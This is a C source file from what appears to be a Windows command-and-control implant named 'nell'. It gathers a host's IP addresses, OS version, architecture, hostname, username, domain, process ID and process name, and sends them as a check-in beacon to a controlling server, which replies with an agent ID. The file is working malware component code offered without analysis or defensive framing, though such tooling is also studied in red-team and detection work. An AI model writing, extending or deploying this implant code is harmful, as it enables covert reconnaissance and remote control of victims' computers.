#include "Checkin.h"
#include "Transport.h"
#include "nell.h"
#include "config.h"

#include <iphlpapi.h>
#include <lm.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "netapi32.lib")

// Get all IPv4 addresses as UINT32 array
UINT32* GetIPAddresses(PUINT32 count)
{
    *count = 0;

    ULONG bufferSize = 0;
    GetAdaptersInfo(NULL, &bufferSize);

    PIP_ADAPTER_INFO adapterInfo = (PIP_ADAPTER_INFO)LocalAlloc(LPTR, bufferSize);
    if (!adapterInfo)
        return NULL;

    if (GetAdaptersInfo(adapterInfo, &bufferSize) != NO_ERROR)
    {
        LocalFree(adapterInfo);
        return NULL;
    }

    // Count adapters first
    UINT32 numAdapters = 0;
    PIP_ADAPTER_INFO current = adapterInfo;
    while (current)
    {
        if (strcmp(current->IpAddressList.IpAddress.String, "0.0.0.0") != 0)
            numAdapters++;
        current = current->Next;
    }

    if (numAdapters == 0)
    {
        LocalFree(adapterInfo);
        return NULL;
    }

    UINT32* ipArray = (UINT32*)LocalAlloc(LPTR, numAdapters * sizeof(UINT32));
    if (!ipArray)
    {
        LocalFree(adapterInfo);
        return NULL;
    }

    // Fill array with IPs
    current = adapterInfo;
    UINT32 idx = 0;
    while (current && idx < numAdapters)
    {
        if (strcmp(current->IpAddressList.IpAddress.String, "0.0.0.0") != 0)
        {
            // Convert dotted IP string to UINT32
            ipArray[idx] = inet_addr(current->IpAddressList.IpAddress.String);
            idx++;
        }
        current = current->Next;
    }

    LocalFree(adapterInfo);
    *count = numAdapters;
    return ipArray;
}

// Get OS name/version
PCHAR GetOSName(VOID)
{
    OSVERSIONINFOW osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOW));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOW);

    // Note: GetVersionEx is deprecated but works for basic info
    #pragma warning(suppress: 4996)
    GetVersionExW(&osvi);

    PCHAR osName = (PCHAR)LocalAlloc(LPTR, 64);
    if (!osName)
        return NULL;

    wsprintfA(osName, "Windows %d.%d.%d",
        osvi.dwMajorVersion,
        osvi.dwMinorVersion,
        osvi.dwBuildNumber);

    return osName;
}

// Get architecture
BYTE GetArchitecture(VOID)
{
    SYSTEM_INFO sysInfo;
    GetNativeSystemInfo(&sysInfo);

    switch (sysInfo.wProcessorArchitecture)
    {
        case PROCESSOR_ARCHITECTURE_AMD64:
            return ARCH_X64;
        case PROCESSOR_ARCHITECTURE_INTEL:
            return ARCH_X86;
        case PROCESSOR_ARCHITECTURE_ARM:
        case PROCESSOR_ARCHITECTURE_ARM64:
            return ARCH_ARM;
        default:
            return ARCH_X86;
    }
}

// Get hostname
PCHAR GetHostName_(VOID)
{
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    PCHAR hostname = (PCHAR)LocalAlloc(LPTR, size);
    if (!hostname)
        return NULL;

    if (!GetComputerNameA(hostname, &size))
    {
        LocalFree(hostname);
        return NULL;
    }

    return hostname;
}

// Get username
PCHAR GetUserName_(VOID)
{
    DWORD size = 256;
    PCHAR username = (PCHAR)LocalAlloc(LPTR, size);
    if (!username)
        return NULL;

    if (!GetUserNameA(username, &size))
    {
        LocalFree(username);
        return NULL;
    }

    return username;
}

// Get domain name (wide string)
PWCHAR GetDomainName(VOID)
{
    LPWSTR buffer = NULL;
    NETSETUP_JOIN_STATUS joinStatus;

    if (NetGetJoinInformation(NULL, &buffer, &joinStatus) != NERR_Success)
        return NULL;

    SIZE_T len = wcslen(buffer) + 1;
    PWCHAR domain = (PWCHAR)LocalAlloc(LPTR, len * sizeof(WCHAR));
    if (domain)
        wcscpy(domain, buffer);

    NetApiBufferFree(buffer);
    return domain;
}

// Get current process name
PCHAR GetProcessName(VOID)
{
    PCHAR path = (PCHAR)LocalAlloc(LPTR, MAX_PATH);
    if (!path)
        return NULL;

    GetModuleFileNameA(NULL, path, MAX_PATH);

    // Extract just the filename
    PCHAR name = strrchr(path, '\\');
    if (name)
    {
        name++; // Skip backslash
        SIZE_T len = strlen(name) + 1;
        PCHAR result = (PCHAR)LocalAlloc(LPTR, len);
        if (result)
            strcpy(result, name);
        LocalFree(path);
        return result;
    }

    return path;
}

// ============================================================================
// UUID Management
// ============================================================================

VOID setUUID(PCHAR newUUID)
{
    if (!newUUID || !nellConfig || !nellConfig->agentID)
        return;
    
    memcpy(nellConfig->agentID, newUUID, 36);
}

// ============================================================================
// Parse Checkin Response
// ============================================================================
// Response format: Action (1) | New UUID (36) | Status (1)
// ============================================================================

BOOL parseCheckin(PParser responseParser)
{
    if (!responseParser)
        return FALSE;

    // Action byte
    BYTE action = ParserGetByte(responseParser);
    if (action != ACTION_CHECKIN)
        return FALSE;

    // New UUID (36 bytes raw, no size prefix)
    PBYTE newUUID = ParserGetBytesRaw(responseParser, 36);
    if (!newUUID)
        return FALSE;

    // Status byte
    BYTE status = ParserGetByte(responseParser);

    if (status != STATUS_SUCCESS)
    {
        LocalFree(newUUID);
        return FALSE;
    }

    // Update agent UUID
    setUUID((PCHAR)newUUID);
    LocalFree(newUUID);

    return TRUE;
}

// ============================================================================
// Main Checkin Function
// ============================================================================
// Protocol:
// | UUID (36) | Action (1) | UUID (36) | NbIPs (4) | IPs... | OS... | etc
// ============================================================================
BOOL DoCheckin(VOID)
{
    PPackage checkin = PackageCreate();
    if (!checkin)
        return FALSE;

    // === HEADER ===
    // Action byte
    PackageAddByte(checkin, ACTION_CHECKIN);

    // === CHECKIN DATA ===
    // UUID (36 bytes, no size prefix)
    PackageAddBytesRaw(checkin, (PBYTE)nellConfig->agentID, 36);

    // IPs
    UINT32 numberOfIPs = 0;
    UINT32* ipTable = GetIPAddresses(&numberOfIPs);
    PackageAddInt32(checkin, numberOfIPs);
    for (UINT32 i = 0; i < numberOfIPs; i++)
    {
        PackageAddInt32(checkin, ipTable[i]);
    }
    if (ipTable)
        LocalFree(ipTable);

    // OS
    PCHAR osName = GetOSName();
    if (osName)
    {
        PackageAddBytes(checkin, (PBYTE)osName, (SIZE_T)strlen(osName));
        LocalFree(osName);
    }
    else
    {
        PackageAddBytes(checkin, (PBYTE)"Unknown", 7);
    }

    // Architecture
    PackageAddByte(checkin, GetArchitecture());

    // Hostname
    PCHAR hostname = GetHostName_();
    if (hostname)
    {
        PackageAddBytes(checkin, (PBYTE)hostname, (SIZE_T)strlen(hostname));
        LocalFree(hostname);
    }
    else
    {
        PackageAddBytes(checkin, (PBYTE)"Unknown", 7);
    }

    // Username
    PCHAR username = GetUserName_();
    if (username)
    {
        PackageAddBytes(checkin, (PBYTE)username, (SIZE_T)strlen(username));
        LocalFree(username);
    }
    else
    {
        PackageAddBytes(checkin, (PBYTE)"Unknown", 7);
    }

    // Domain (wide string)
    PWCHAR domain = GetDomainName();
    if (domain)
    {
        SIZE_T domainLen = wcslen(domain) * sizeof(WCHAR);
        PackageAddBytes(checkin, (PBYTE)domain, domainLen);
        LocalFree(domain);
    }
    else
    {
        PackageAddInt32(checkin, 0); // Empty domain
    }

    // PID
    PackageAddInt32(checkin, GetCurrentProcessId());

    // Process Name
    PCHAR procName = GetProcessName();
    if (procName)
    {
        PackageAddBytes(checkin, (PBYTE)procName, (SIZE_T)strlen(procName));
        LocalFree(procName);
    }
    else
    {
        PackageAddBytes(checkin, (PBYTE)"Unknown", 7);
    }

    // External IP (placeholder)
    PackageAddBytes(checkin, (PBYTE)"0.0.0.0", 7);

    // === SEND ===
    PParser response = sendPackage(checkin);
    PackageDestroy(checkin);

    if (!response)
        return FALSE;

    // === PARSE RESPONSE ===
    BOOL success = parseCheckin(response);
    ParserDestroy(response);

    return success;
}
